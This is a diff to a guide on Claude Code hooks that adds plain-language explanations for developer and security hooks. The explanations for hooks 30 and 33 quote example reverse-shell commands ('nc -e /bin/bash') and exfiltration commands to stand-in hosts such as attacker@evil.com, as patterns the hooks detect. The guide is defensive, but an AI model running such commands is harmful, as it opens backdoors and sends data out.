@@ -524,6 +524,10 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 **The magic**: Detects when you're about to `git commit`, then automatically runs the right formatter (Prettier for JavaScript, Black for Python) based on what files it finds in your project. No more "oops, I committed ugly code" moments!
 
 ### 3. Test Suite Validator
+### *The "No Broken Code" Bouncer* 🧪
+
+**Simple explanation**: Like having a strict doorman who won't let you into the fancy restaurant unless you're properly dressed. This hook runs your tests before every commit/push and literally blocks you from pushing broken code.
+
 ```json
 {
   "hooks": {
@@ -541,6 +545,8 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
   }
 }
 ```
+
+**Why this saves your career**: Prevents the embarrassing "oops, I broke the build" moments that make senior developers give you disappointed looks. The `exit 2` actually **stops** the commit if tests fail, so you literally cannot push broken code. It's like having a safety net that catches bugs before they reach your teammates.
 
 ### 4. Environment Safety Check
 ### *The "Wait, Are You Sure About That?" Assistant* 🚨
@@ -568,6 +574,10 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 **Life-saving feature**: When Claude tries to run commands like `rm -rf` (delete everything), `sudo` (admin access), or `format` (wipe a drive), this hook slams on the brakes and says "WHOA THERE!" The `exit 2` actually **blocks** the dangerous command from running. It's like having a safety net for your terminal!
 
 ### 5. Docker Resource Monitor
+### *The "How Much Space Do I Have Left?" Assistant* 🐳
+
+**Simple explanation**: Like having a fuel gauge in your car that automatically shows up whenever you start the engine. This hook displays your Docker disk usage every time you run Docker commands, so you know when you're running out of space.
+
 ```json
 {
   "hooks": {
@@ -586,7 +596,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this prevents disasters**: Docker quietly eats up disk space like a hungry teenager raids the fridge. Without monitoring, you suddenly get "no space left on device" errors that crash everything. This hook gives you a heads-up about resource usage before you hit the wall - like knowing you're almost out of gas before your car dies on the highway.
+
 ### 6. Dependency Vulnerability Scanner
+### *The "Is This Package Sketchy?" Detective* 🔍
+
+**Simple explanation**: Like having a security expert who automatically checks the background of every new person you invite to your party. This hook scans packages for known vulnerabilities every time you install something new.
+
 ```json
 {
   "hooks": {
@@ -605,7 +621,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this protects your business**: Installing a package with a known vulnerability is like leaving your front door unlocked with a sign saying "valuables inside." This hook warns you about packages with security issues **before** they become part of your application. It's much easier to find a secure alternative now than to deal with a data breach later.
+
 ### 7. Code Review Checklist Reminder
+### *The "Don't Forget The Important Stuff" Reminder* 📝
+
+**Simple explanation**: Like having a mom who always asks "Did you brush your teeth? Did you pack your lunch?" before school. This hook shows you a checklist after every code edit to make sure you didn't forget the important stuff.
+
 ```json
 {
   "hooks": {
@@ -624,7 +646,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this improves code quality**: We all get tunnel vision when coding and focus only on making the feature work. This hook reminds you to think about the bigger picture - security, performance, tests, docs. It's like having a senior developer looking over your shoulder, gently nudging you to consider all the professional best practices that separate good code from great code.
+
 ### 8. Performance Impact Analyzer
+### *The "How Long Did That Take?" Stopwatch* ⏱️
+
+**Simple explanation**: Like having a fitness tracker that automatically times your workouts. This hook measures how long your builds, compiles, and tests take, so you can spot when things are getting slower.
+
 ```json
 {
   "hooks": {
@@ -643,7 +671,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this saves your sanity**: Slow builds kill developer productivity. When your test suite goes from 30 seconds to 5 minutes, you need to know immediately - not after months of frustration. This hook tracks performance trends and helps you catch regressions early. It's like having a performance dashboard that alerts you when your development workflow starts getting sluggish.
+
 ### 9. Branch Protection Enforcer
+### *The "Don't Push to Main" Police* 🚫
+
+**Simple explanation**: Like having a security guard who stops you from walking into the "Authorized Personnel Only" area. This hook prevents you from accidentally pushing code directly to the main branch, forcing you to use proper feature branches.
+
 ```json
 {
   "hooks": {
@@ -662,7 +696,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this saves team harmony**: Pushing directly to main/master bypasses code reviews, breaks CI/CD workflows, and can crash production. This hook enforces proper Git workflow by literally blocking direct pushes (`exit 2`). It's like having a process enforcer that keeps your team following best practices even when you're in a hurry.
+
 ### 10. Database Backup Reminder
+### *The "Did You Backup First?" Conscience* 💾
+
+**Simple explanation**: Like having a wise old DBA who grabs your arm every time you reach for a dangerous SQL command and asks "When did you last backup the database?" This hook detects destructive database operations and reminds you to backup first.
+
 ```json
 {
   "hooks": {
@@ -681,7 +721,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this prevents career-ending disasters**: Running `DROP TABLE users` without a backup is like performing surgery without a medical license. This hook catches destructive database commands and reminds you to backup first. It's much better to be safe than to spend your weekend restoring data from a week-old backup while your CEO asks uncomfortable questions.
+
 ### 11. API Key Scanner
+### *The "Secrets Detector" Assistant* 🔑
+
+**Simple explanation**: Like having a paranoid friend who checks your pockets before you leave the house to make sure you didn't accidentally grab the wrong keys. This hook scans your code files for things that look like API keys, passwords, or tokens.
+
 ```json
 {
   "hooks": {
@@ -700,7 +746,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this prevents security breaches**: Hardcoding API keys in your source code is like writing your bank PIN on a sticky note and leaving it on your monitor. If your repo becomes public or gets compromised, those secrets are exposed to the world. This hook catches common secret patterns and reminds you to use environment variables instead - keeping your keys safe and secure.
+
 ### 12. Code Complexity Monitor
+### *The "This File Is Getting Huge" Advisor* 📏
+
+**Simple explanation**: Like having a personal trainer who taps you on the shoulder when your workout gets too intense. This hook checks if your files are getting too big and suggests breaking them down into smaller, more manageable pieces.
+
 ```json
 {
   "hooks": {
@@ -719,7 +771,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this improves maintainability**: Giant files are like messy rooms - the bigger they get, the harder it becomes to find anything. A 1000-line file is a nightmare to debug, test, and maintain. This hook nudges you to refactor before files become unwieldy monsters. It's much easier to split a 300-line file than to untangle a 2000-line mess later.
+
 ### 13. License Compliance Checker
+### *The "Legal Eagle" Assistant* ⚖️
+
+**Simple explanation**: Like having a lawyer friend who always asks "Are you sure you can use that?" when you borrow something. This hook reminds you to check package licenses whenever you install new dependencies, so you don't accidentally use something that could get your company sued.
+
 ```json
 {
   "hooks": {
@@ -738,7 +796,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this saves your company from lawsuits**: Some open source licenses (like GPL) require you to open source your entire application if you use them commercially. Others have attribution requirements. This hook helps you catch incompatible licenses before they become legal problems. It's much better to find a different package now than to explain to your legal team later why you owe someone money.
+
 ### 14. Documentation Sync Checker
+### *The "Don't Forget to Update the Docs" Reminder* 📖
+
+**Simple explanation**: Like having a helpful colleague who taps you on the shoulder after you change something important and asks "Did you update the documentation too?" This hook reminds you to keep docs in sync whenever you modify code files.
+
 ```json
 {
   "hooks": {
@@ -757,7 +821,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this keeps your team happy**: Outdated documentation is worse than no documentation - it actively misleads people and wastes their time. When you change an API, add a feature, or modify behavior, the docs need to reflect that. This hook reminds you to update documentation while the changes are fresh in your mind, preventing the "documentation debt" that makes future developers curse your name.
+
 ### 15. Resource Usage Alert
+### *The "System Health Monitor" Assistant* 💾
+
+**Simple explanation**: Like having a car dashboard that warns you when you're low on gas or your engine is overheating. This hook checks your computer's disk space and memory usage with every command and warns you before you run out.
+
 ```json
 {
   "hooks": {
@@ -776,7 +846,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this prevents system crashes**: Running out of disk space or memory causes mysterious failures, corrupted files, and system crashes. This hook gives you early warning when resources are getting low (85% threshold), so you can clean up before things break. It's like having a early warning system that prevents the "why is everything so slow?" debugging sessions.
+
 ### 16. Timezone-Aware Logging
+### *The "Perfect Timestamp" Logger* 🕰️
+
+**Simple explanation**: Like having a security camera that records everything with accurate timestamps that work no matter where you are in the world. This hook logs every tool Claude uses with UTC timestamps, so your logs are consistent across time zones.
+
 ```json
 {
   "hooks": {
@@ -795,7 +871,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why UTC timestamps matter**: When debugging issues or analyzing logs, timezone confusion is a nightmare. "The bug happened at 3 PM" - but 3 PM where? EST? PST? This hook uses UTC timestamps so your logs are unambiguous and sortable, even when working with a global team. It's essential for compliance, debugging, and sanity.
+
 ### 17. CI/CD Status Monitor
+### *The "Pipeline Health Check" Assistant* 🚀
+
+**Simple explanation**: Like having a race car spotter who immediately tells you about track conditions after you make a pit stop. This hook automatically checks your CI/CD pipeline status whenever you push code, so you know if your build is going to succeed or fail.
+
 ```json
 {
   "hooks": {
@@ -814,7 +896,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this saves you from surprises**: Nothing's worse than pushing code and finding out hours later that the build failed. This hook gives you immediate feedback about your pipeline health, so you can fix issues quickly. It's like having a real-time dashboard that tells you if your deployment is going to succeed before you go to lunch.
+
 ### 18. Environment Variable Validator
+### *The "Did You Set Your Env Vars?" Checker* ⚠️
+
+**Simple explanation**: Like having a flight attendant who checks that everyone has their seatbelt fastened before takeoff. This hook verifies that critical environment variables are set before you run Docker containers, preventing the "why isn't this working?" debugging sessions.
+
 ```json
 {
   "hooks": {
@@ -833,7 +921,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this prevents headaches**: Docker containers failing with cryptic errors because `DATABASE_URL` isn't set is a classic developer time-waster. This hook checks for required environment variables before starting containers, giving you clear error messages instead of mysterious failures. It's like a preflight checklist that catches configuration problems before they waste your time.
+
 ### 19. Backup Automation Trigger
+### *The "Safety Copy" Assistant* 💾
+
+**Simple explanation**: Like having a paranoid friend who automatically makes photocopies of important documents before you edit them. This hook creates timestamped backups of critical configuration files whenever you modify them.
+
 ```json
 {
   "hooks": {
@@ -852,7 +946,13 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
 }
 ```
 
+**Why this saves you from configuration disasters**: Configuration files are the most dangerous files to edit - one typo can break your entire application. This hook automatically creates dated backups of config files (like `.env`, `settings.json`, etc.) so you can quickly restore if something goes wrong. It's insurance for your most critical files - you hope you never need it, but you're really glad it's there when you do.
+
 ### 20. Project Health Dashboard
+### *The "How's Everything Looking?" Reporter* 📊
+
+**Simple explanation**: Like having a doctor who gives you a quick health checkup after every workout. This hook shows you a project health summary whenever you run tests, giving you a snapshot of your codebase's overall wellness.
+
 ```json
 {
   "hooks": {
@@ -870,6 +970,8 @@ Think of these hooks as hiring a bunch of specialized assistants for your develo
   }
 }
 ```
+
+**Why this keeps you on top of things**: It's easy to focus on features and forget about project maintenance. This hook gives you regular health checkups that show test status, uncommitted changes, and outdated dependencies. It's like having a dashboard that highlights technical debt before it becomes a crisis - helping you stay proactive about project health.
 
 ---
 
@@ -904,6 +1006,10 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 **Why this matters**: Creates a tamper-proof audit trail (with UTC timestamps!) while actively preventing commands that could be used for privilege escalation, data destruction, or network backdoors. Perfect for compliance requirements and incident investigation.
 
 ### 22. Network Activity Monitor
+### *The "Who's Talking to Who?" Watchdog* 🌐
+
+**Simple explanation**: Like having a security guard who monitors everyone entering and leaving the building. This hook detects when you're using network tools and shows you what services are currently listening for connections on your system.
+
 ```json
 {
   "hooks": {
@@ -921,6 +1027,8 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
   }
 }
 ```
+
+**Why this strengthens security awareness**: Network activity can be legitimate (downloading packages) or suspicious (data exfiltration). This hook raises awareness by showing active network listeners whenever you use network tools. It helps you spot unexpected services, identify potential backdoors, and maintain situational awareness about your system's network exposure.
 
 ### 23. Code Secrets Scanner
 ### *The "Secrets Police" Assistant* 🔐
@@ -948,6 +1056,10 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 **The pattern it catches**: Lines that look like `api_key = "sk-1234567890abcdef"` or `password = "super_secret_123"`. If it finds anything suspicious, it **blocks the file write** (exit 2) and yells at you to use environment variables instead. Prevents the classic "oops I committed my API keys" disaster!
 
 ### 24. Vulnerability Database Checker
+### *The "Is This Container Safe?" Scanner* 🛡️
+
+**Simple explanation**: Like having a food safety inspector who checks every ingredient before it goes into your kitchen. This hook automatically scans Docker images for known vulnerabilities whenever you pull or run them, warning you about security risks.
+
 ```json
 {
   "hooks": {
@@ -966,7 +1078,13 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 }
 ```
 
+**Why this prevents supply chain attacks**: Container images often contain outdated packages with known CVEs. Running vulnerable containers is like inviting attackers in through the front door. This hook uses Trivy to scan images against vulnerability databases, giving you a security report before the container starts running. It's an essential defense against supply chain attacks in containerized environments.
+
 ### 25. File Integrity Monitor
+### *The "File Fingerprint" Tracker* 🔍
+
+**Simple explanation**: Like having a detective who takes fingerprints of every important document to prove it hasn't been tampered with. This hook calculates cryptographic hashes of files you modify and logs them with timestamps for integrity verification.
+
 ```json
 {
   "hooks": {
@@ -985,7 +1103,13 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 }
 ```
 
+**Why this supports forensic analysis**: File integrity monitoring is crucial for detecting unauthorized changes, supporting compliance audits, and forensic investigations. The SHA256 hashes create a cryptographic trail of all file modifications. If a critical file gets compromised, you can use this log to determine exactly when it changed and what the original content was.
+
 ### 26. Permission Escalation Detector
+### *The "Who's Trying to Become Admin?" Monitor* ⬆️
+
+**Simple explanation**: Like having a security system that alerts you whenever someone tries to use the master key. This hook detects attempts to gain elevated privileges (sudo, su, etc.) and logs who's trying to become admin.
+
 ```json
 {
   "hooks": {
@@ -1004,7 +1128,13 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 }
 ```
 
+**Why this catches attacks early**: Privilege escalation is often the first step in an attack - malware tries to gain admin rights to install itself permanently or access sensitive data. This hook creates an audit trail of all privilege escalation attempts, helping you spot both legitimate admin tasks and potential security breaches. It's essential for compliance and incident response.
+
 ### 27. Crypto Operation Monitor
+### *The "Encryption Activity" Tracker* 🔐
+
+**Simple explanation**: Like having a specialist who notices whenever someone is working with locks, keys, or safes. This hook detects cryptographic operations (key generation, encryption, signing) and logs what algorithms are being used.
+
 ```json
 {
   "hooks": {
@@ -1023,7 +1153,13 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 }
 ```
 
+**Why this improves crypto hygiene**: Cryptographic operations should be visible and auditable - you want to know when keys are generated, what algorithms are used, and when encryption/decryption happens. This hook helps track crypto activity for compliance, debugging, and security audits. It's also useful for detecting weak or deprecated algorithms before they become security risks.
+
 ### 28. Container Security Scanner
+### *The "Container Safety Inspector" Assistant* 🛡️
+
+**Simple explanation**: Like having a safety inspector who checks construction sites for dangerous practices. This hook examines Docker run commands for insecure configurations like privileged mode or running as root user.
+
 ```json
 {
   "hooks": {
@@ -1042,7 +1178,13 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 }
 ```
 
+**Why this prevents container escapes**: Running containers with `--privileged` or as root user breaks container isolation and can lead to host system compromise. This hook warns you about dangerous container configurations that could be exploited for container escape attacks. It's like having security guardrails that prevent you from accidentally creating vulnerable deployments.
+
 ### 29. SQL Injection Pattern Detector
+### *The "Dangerous SQL" Detector* 🚨
+
+**Simple explanation**: Like having a database expert who slaps your hand every time you try to build SQL queries by gluing strings together. This hook spots SQL injection patterns in your code and stops you from writing vulnerable database queries.
+
 ```json
 {
   "hooks": {
@@ -1061,7 +1203,13 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 }
 ```
 
+**Why this prevents database takeovers**: SQL injection is one of the most dangerous web vulnerabilities - it can lead to complete database compromise, data theft, and system takeover. This hook detects patterns like `"SELECT * FROM users WHERE id = " + userId` and **blocks the file write** (`exit 2`), forcing you to use parameterized queries instead. It's like having a database security expert preventing the #1 web application security risk.
+
 ### 30. Suspicious Network Patterns
+### *The "Backdoor Detector" Alert System* 🚨
+
+**Simple explanation**: Like having a security expert who recognizes the tools and techniques that hackers use to create backdoors. This hook detects command patterns commonly used for reverse shells and other malicious network activities.
+
 ```json
 {
   "hooks": {
@@ -1080,7 +1228,13 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 }
 ```
 
+**Why this stops malicious activity**: Reverse shells are a common way for attackers to maintain persistent access to compromised systems. Commands like `nc -e /bin/bash` or `python -c "import socket..."` are classic backdoor techniques. This hook recognizes these patterns and **blocks them** (`exit 2`), preventing accidental or malicious execution of backdoor commands.
+
 ### 31. Certificate Validation Monitor
+### *The "TLS Safety Checker" Assistant* ⚠️
+
+**Simple explanation**: Like having a security guard who stops you from ignoring ID checks at a secure building. This hook warns you when you're disabling TLS certificate validation, which makes your connections vulnerable to man-in-the-middle attacks.
+
 ```json
 {
   "hooks": {
@@ -1099,7 +1253,13 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 }
 ```
 
+**Why certificate validation matters**: Disabling certificate validation (`curl -k` or `wget --no-check-certificate`) defeats the entire purpose of HTTPS. It makes your connection vulnerable to man-in-the-middle attacks where attackers can intercept and modify your traffic. This hook alerts you to these dangerous practices, helping prevent credential theft and data tampering.
+
 ### 32. Binary Execution Monitor
+### *The "Unknown Program" Tracker* 🔍
+
+**Simple explanation**: Like having a security system that logs whenever someone runs an unfamiliar program. This hook detects when you're executing binary files and logs their cryptographic fingerprints for tracking and analysis.
+
 ```json
 {
   "hooks": {
@@ -1118,7 +1278,13 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 }
 ```
 
+**Why this aids malware detection**: Unknown or modified binaries could be malware, backdoors, or compromised tools. This hook creates an execution log with SHA256 hashes that can be checked against malware databases or used for forensic analysis. It's like having a program execution audit trail that helps identify suspicious software and track binary provenance.
+
 ### 33. Data Exfiltration Detector
+### *The "Data Leaving the Building" Monitor* 📤
+
+**Simple explanation**: Like having a security guard who notices when someone is carrying boxes of documents out of the office. This hook detects commands that transfer data to external systems and logs where the data is going.
+
 ```json
 {
   "hooks": {
@@ -1137,7 +1303,13 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 }
 ```
 
+**Why this catches data theft**: Data exfiltration is how attackers steal sensitive information from compromised systems. Commands like `scp sensitive_file.txt attacker@evil.com` or `curl -T database.sql http://malicious.site` are red flags. This hook creates visibility into data transfers, helping detect both legitimate backups and malicious data theft attempts.
+
 ### 34. Process Injection Monitor
+### *The "Memory Tampering" Detector* 💉
+
+**Simple explanation**: Like having a security system that alerts when someone tries to mess with other people's work or inject themselves into ongoing projects. This hook detects attempts to attach debuggers or inject code into running processes.
+
 ```json
 {
   "hooks": {
@@ -1156,7 +1328,13 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
 }
 ```
 
+**Why this catches advanced attacks**: Process injection is a sophisticated attack technique where malware injects malicious code into legitimate running processes to hide and persist. Tools like `gdb attach` or direct `/proc/PID/mem` manipulation are common injection methods. This hook creates visibility into these advanced techniques, helping detect both legitimate debugging and malicious process manipulation.
+
 ### 35. Compliance Evidence Collector
+### *The "Perfect Audit Trail" Recorder* 📁
+
+**Simple explanation**: Like having a court stenographer who records every single action with perfect detail for legal purposes. This hook creates a comprehensive, tamper-evident audit log of every Claude Code activity with timestamps, user info, and session data.
+
 ```json
 {
   "hooks": {
@@ -1174,6 +1352,8 @@ Think of these hooks as your personal cybersecurity team that never sleeps, neve
   }
 }
 ```
+
+**Why this satisfies auditors**: Compliance frameworks (SOX, HIPAA, PCI-DSS, etc.) require detailed audit trails of all system activities. This hook creates JSON-formatted logs with precise timestamps, user attribution, and session correlation. The JSONL format makes it easy to parse for compliance reporting, forensic analysis, and regulatory audits. It's your insurance policy against "we need to prove what happened" requests.
 
 ---
 
